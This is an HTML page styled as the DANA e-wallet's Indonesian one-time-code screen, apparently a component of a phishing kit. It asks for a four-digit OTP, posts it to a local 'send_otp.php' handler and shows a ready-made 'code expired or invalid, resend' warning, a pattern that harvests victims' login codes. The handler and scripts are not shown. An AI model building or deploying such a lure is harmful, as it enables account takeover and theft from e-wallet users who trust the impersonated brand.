<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="refresh">
        <title>DANA | dana.id</title>
        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
        <link rel="stylesheet" type="text/css" href="./../lib/style/otp.css">
        <link rel="stylesheet" type="text/css" href="./../lib/style/spinner.css">
        <style>

        </style>
    </head>
    <body>
        <div class="raw">
            <img class="back" src="./../assets/img/back.png">
            <img class="dana_logo" src="./../assets/img/dana_logo.png">
        </div>
        <div class="background">
            <div class="container" id="container">
                <center>
                    <h1>Masukkan OTP</h1>
                    <h2>Kode OTP telah dikirm ke nomor Anda</h2>
                    <form action="./../auth/lib/send_otp.php" method="post">
                        <div class="four_otp" id="four_otp">
                            <input type="number" id="otp1" maxlength="1" autocomplete="off" class="inpOtp" name="otp1" ></input>
                            <input type="number" id="otp2" maxlength="1" autocomplete="off" class="inpOtp" name="otp2" ></input>
                            <input type="number" id="otp3" maxlength="1" autocomplete="off" class="inpOtp" name="otp3" ></input>
                            <input type="number" id="otp4" maxlength="1" autocomplete="off" class="inpOtp" name="otp4" ></input>
                        </div>
                    </form>
<small style="color: red; font-weight:lighter; ">Kode OTP Telah Kedaluwarsa atau Invalid<br> Silahkan
                    Kirim
                    Ulang Kode OTP Baru.</small>
                    <p class="resend">KIRIM ULANG (<span id="time">60</span>s)</p>
                </center>
            </div>
        </div>
        <div id="process" name="process" class="process" style="display: none;">
            <div class="loading">
                <img src="./../assets/img/load_bg.png">
                <img class="spinner" src="./../assets/img/load_spin.png">
            </div>
        </div>
    </body>
    <script src="./../lib/functions/function_otp.js"></script>
</html>
